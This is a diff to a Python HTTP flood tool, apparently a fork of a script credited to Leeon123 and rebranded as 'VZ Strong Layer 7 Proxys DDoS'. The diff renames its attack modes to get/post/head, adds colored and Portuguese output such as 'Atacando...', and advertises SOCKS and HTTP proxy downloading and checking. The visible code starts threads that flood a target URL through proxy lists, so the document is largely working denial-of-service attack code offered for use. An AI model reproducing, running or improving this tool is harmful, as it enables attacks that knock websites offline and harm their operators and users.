@@ -17,26 +17,23 @@ import os
 
 
 
-print ('''
+print (''' \033[0;35;40m
 ██╗░░██╗░░██╗██╗██╗░░██╗  /////////////
-██║░░██║░██╔╝██║╚██╗██╔╝ | VZ-attack |/
+██║░░██║░██╔╝██║╚██╗██╔╝ | VZ Strong |/
 ███████║██╔╝░██║░╚███╔╝░ |-----------|/ 
 ██╔══██║███████║░██╔██╗░ |  Layer 7  |/ 
 ██║░░██║╚════██║██╔╝╚██╗ |Proxys DDoS|/ 
 ╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝ |___________|/
 >--------------------------------------------->
 Version 3.8.0 (27/12/2022)
-                              Edited by VanZ1K
 ┌─────────────────────────────────────────────┐
-│        Tos: Para testes e        │
+│             #Edited by Vanqui$h             |
 ├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Added Http Proxy Support       │
-│          [+] Optimization                   │
-│          [+] Changed Varible Name           │
-├─────────────────────────────────────────────┤
-│                                             │
-└─────────────────────────────────────────────┘''')
+│             Novas Funções:                  │
+│    [+] Modos: get(default), head, post      │
+│    [+] Proxy Download: Socks 4/5 e http     │
+│    [+] Checker proxy list                   │
+├─────────────────────────────────────────────┘\033[m ''')
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -83,7 +80,7 @@ referers = [
 ]
 
 ######### Default value ########
-mode = "vz"
+mode = "get"
 url = ""
 proxy_ver = "5"
 brute = False
@@ -103,9 +100,9 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th = threading.Thread(target = post,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
-	elif mode == "vz":
+	elif mode == "get":
 		for _ in range(thread_num):
-			th = threading.Thread(target = vz,args=(event,proxy_type,))
+			th = threading.Thread(target = get,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
 	elif mode == "head":
@@ -229,7 +226,7 @@ def InputOption(question,options,default):
 			continue
 	return ans
 
-def vz(event,proxy_type):
+def get(event,proxy_type):
 	header = GenReqHeader("get")
 	proxy = Choice(proxies).strip().split(":")
 	add = "?"
@@ -465,7 +462,7 @@ def check_socks(ms):#Coded by Leeon123
 	print("> They are saved in "+out_file)
 			
 def check_list(socks_file):
-	print("> Checking list")
+	print("\033[0;32;40m> Checking list\033[m")
 	temp = open(socks_file).readlines()
 	temp_list = []
 	for i in temp:
@@ -568,7 +565,7 @@ def DownloadProxies(proxy_ver):
 	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
-	print('''===============  VZ-attack help list  ===============
+	print('''============== VZ help list  ===============
    -h/help   | showing this message
    -url      | set target url
    -m/mode   | set program mode
@@ -603,7 +600,7 @@ def main():
 	proxy_type = 5
 	period = 60
 	help = False
-	print("> Mode: [vz/post/head]")#slow]")
+	print("\033[0;32;40m> Modos: [get/post/head] \033[m")
 	for n,args in enumerate(sys.argv):
 		if args == "-help" or args =="-h":
 			help =True
@@ -611,7 +608,7 @@ def main():
 			ParseUrl(sys.argv[n+1])
 		if args=="-m" or args=="-mode":
 			mode = sys.argv[n+1]
-			if mode not in ["vz","post","head"]:#,"slow"]:
+			if mode not in ["get","post","head"]:
 				print("> -m/-mode argument error")
 				return
 		if args =="-v":
@@ -669,7 +666,7 @@ def main():
 	if len(proxies) == 0:
 		print("> There are no more proxies. Please download a new proxies list.")
 		return
-	print ("> Number Of Proxies: %d" %(len(proxies)))
+	print ("\033[0;32;40m> Number Of Proxies: %d\033[m" %(len(proxies)))
 	if check_proxies:
 		check_socks(3)
 
@@ -679,7 +676,7 @@ def main():
 		PrintHelp()
 
 	if target == "":
-		print("> There is no target. End of process ")
+		print("\033[0;33;40m> There is no target. End of process\033[m")
 		return
 	'''
 	if mode == "slow":
@@ -688,13 +685,13 @@ def main():
 		th.start()
 	else:'''
 	event = threading.Event()
-	print("> Building threads...")
+	print("\033[0;32;40m> Building threads...\033[m")
 	build_threads(mode,thread_num,event,proxy_type)
 	event.clear()
 	#input("Press Enter to continue.")
 	event.set()
-	print("> Flooding...")
+	print("\033[0;31;40m> Atacando...\033[m")
 	time.sleep(period)
 
 if __name__ == "__main__":
-	main()#Coded by Leeon123
+	main()
